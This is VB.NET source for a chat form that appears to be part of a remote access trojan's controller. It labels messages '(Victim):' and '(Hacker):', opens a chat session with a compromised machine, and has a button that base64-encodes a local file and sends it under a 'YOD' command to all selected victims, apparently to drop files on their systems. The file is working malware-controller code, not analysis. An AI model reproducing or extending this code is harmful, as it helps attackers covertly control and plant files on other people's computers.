Imports System.Text.RegularExpressions

Public Class Form29

    Public xxx As Integer
    Private Sub Chatt_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        Form1.S.Send(xxx, "ccl")
    End Sub

    Private Sub Chatt_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Panel2.Hide()
        tOP.Text = 1
        Form1.S.Send(xxx, "ochat")
        Recv.Text = "Chat Succeeded Connected ..."
        'Recv.Controls.Add(Panel2)
    End Sub
    Private Sub Chatt_Resize(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Resize
        Recv.ScrollToCaret()
    End Sub



    Private Sub Recv_TextChanged(sender As Object, e As EventArgs) Handles Recv.TextChanged

        On Error Resume Next
        Dim era7 As Integer = Recv.Find("(Victim):", 1, RichTextBoxFinds.None)
        Do While era7 > -0
            Recv.Select(era7, "(Victim):".Length)
            Recv.SelectionColor = Color.MediumAquamarine
            era7 = Recv.Find("(Victim):", era7 + "(Victim):".Length, RichTextBoxFinds.None)
            Application.DoEvents()
            Recv.HideSelection = True
        Loop
        On Error Resume Next
        Dim era7r As Integer = Recv.Find("(Hacker):", 1, RichTextBoxFinds.None)
        Do While era7r > -0
            Recv.Select(era7r, "(Hacker):".Length)
            Recv.SelectionColor = Color.DodgerBlue
            era7r = Recv.Find("(Hacker):", era7r + "(Hacker):".Length, RichTextBoxFinds.None)
            Application.DoEvents()
            Recv.HideSelection = True
        Loop
    End Sub


    Private Sub Sendbox_TextChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub Sendbox_KeyPress(sender As Object, e As KeyPressEventArgs)

    End Sub
    'My.Computer.Audio.Play("C:\Windows\Media\Windows Pop-up Blocked.wav", AudioPlayMode.Background)

    Private Sub Sendbox_KeyPress1(sender As Object, e As KeyPressEventArgs) Handles Sendbox.KeyPress
        If e.KeyChar = Chr(Keys.Enter) Then
            If Sendbox.Text = "" Then Exit Sub
            Recv.Text += Environment.NewLine & "(Hacker):" & Sendbox.Text
            Form1.S.Send(xxx, "recv" & "|U|" & Sendbox.Text)
            Sendbox.Clear()
            'Label1.Text = 1
        End If
    End Sub





    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If Sendbox.Text = "" Then Exit Sub
        Recv.Text += Environment.NewLine & "(Hacker):" & Sendbox.Text
        Form1.S.Send(xxx, "recv" & "|U|" & Sendbox.Text)
        Sendbox.Clear()
        'Label1.Text = 1
    End Sub



    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        On Error Resume Next
        Dim o As New OpenFileDialog
        o.ShowDialog()
        Dim n As New IO.FileInfo(o.FileName)
        If o.FileName.Length > 0 Then
            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "YOD" & "|U|" & n.Name & "|U|" & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
                Form1.colord()

                ''''''''''''''''''''''''''''''''

                Recv.Text += Environment.NewLine & "(Hacker):" & Sendbox.Text + "-->send " + "-> " + o.FileName + " |Time : " + TimeValue(Now)
                Form1.S.Send(xxx, "recv" & "|U|" & Sendbox.Text + "--> ")
                Sendbox.Clear()
            Next

        Else

        End If
    End Sub

    Private Sub Sendbox_TextChanged_1(sender As Object, e As EventArgs) Handles Sendbox.TextChanged
        On Error Resume Next
        Me.Label1.Text = "Letters[x]".Replace("x", Len(Sendbox.Text))
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        If Label2.Text = "019870-*098+21{1}\\*+33-9=#oD" Then
            tOP.Text += 1

            If tOP.Text = 4 Then
                Panel2.Hide()
                Label2.Text = "\.exe"
            End If




        End If

        If Label2.Text = "019870-*098+21{2}//*+33-9=#oD" Then
            tOP.Text += 1

            If tOP.Text = 4 Then
                Panel2.Hide()
                Label2.Text = "\.exe"
            End If




        End If





    End Sub

    Private Sub Panel2_Paint(sender As Object, e As PaintEventArgs) Handles Panel2.Paint

    End Sub
End Class